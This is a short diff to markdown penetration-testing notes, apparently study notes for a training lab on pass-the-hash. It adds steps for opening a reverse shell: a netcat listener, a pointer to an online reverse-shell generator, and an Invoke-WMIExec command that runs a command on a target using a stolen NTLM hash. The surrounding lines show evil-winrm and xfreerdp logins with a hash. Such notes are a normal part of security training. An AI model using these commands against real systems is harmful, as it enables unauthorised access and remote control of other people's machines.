@@ -68,4 +68,17 @@ evil-winrm -i $IP -u $USERNAME -H $HASH
 	xfreerdp /v:$IP /u:$USERNAME /pth:$HASH
 	```
 
-
+- Create a reverse shell
+	- Set up a nc listener
+	```cmd
+	nc -lnvp 9999
+	```
+	
+	- Create a simple reverse shell using PowerShell, we can visit https://www.revshells.com/
+	
+	![](https://academy.hackthebox.com/storage/modules/147/rshellonline.jpg)
+	
+	- Use Invoke-TheHash tool to execute the command
+	```cmd
+	Invoke-WMIExec -Target $TARGET -Domain $DOMAIN -Username $USERNAME -Hash $HASH -Command $COMMAND
+	```
